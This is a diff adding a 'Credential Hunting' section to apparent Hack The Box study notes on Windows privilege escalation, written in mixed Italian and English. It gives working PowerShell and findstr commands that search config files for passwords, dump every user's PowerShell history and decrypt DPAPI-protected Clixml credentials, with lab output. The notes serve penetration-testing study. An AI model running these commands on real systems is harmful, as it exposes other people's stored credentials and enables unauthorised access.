@@ -924,4 +924,69 @@ filtro per procmon: **If we change the procmon filter to focus on entries whose 
 poi basta che scriviamo la dll 
 
 
+# Credential Hunting
 
+Le credenziali ci possono dare molti vantaggi durante gli assesment.
+
+## Application Configuration Files
+
+`PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml` cerca la stringa password in tutti i file con quelle estensioni.
+
+Sensitive IIS information such as credentials may be stored in a web.config file. (C:\inetpub\wwwroot\web.config non solo questo path)
+
+## Dictionary Files
+
+### Chrome Dictionary Files
+`PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password`
+
+## Unattended Installation Files
+Questi file possono definire auto-logon settings o account aggiuntivi da creare come parte dell' installazione.
+
+password in **unattend.xml** sono storate in plaintext o base64 encoded.
+
+Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.
+
+## Powershell History File
+
+da windows10 Powershell stora la history in **C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.**
+
+### Confirming PowerShell History Save PAth
+Ci sono molti comandi che passano le credenziali in command line.
+
+`PS C:\htb> (Get-PSReadLineOption).HistorySavePath` Printa il save path delle credenziali.
+
+### Reading powershell history file
+
+`PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath`
+
+### Reading every powershell history path that we can access
+
+`PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`
+
+
+## Powershell Credentials
+
+Powershell credentials sono spesso usate per scripting e task di automazione come un modo di storare credenziali criptate in modo conveniente.
+
+Spesso sono protette da **DPAPI** che significa che possono essere decriptate solo dall'utente e dallo stesso computer che le hanno create.
+
+```
+# Connect-VC.ps1
+# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
+$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
+$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
+Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
+```
+### Decrypting powershell credentials
+
+```
+PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
+PS C:\htb> $credential.GetNetworkCredential().username
+
+bob
+
+
+PS C:\htb> $credential.GetNetworkCredential().password
+
+Str0ng3ncryptedP@ss!
+```
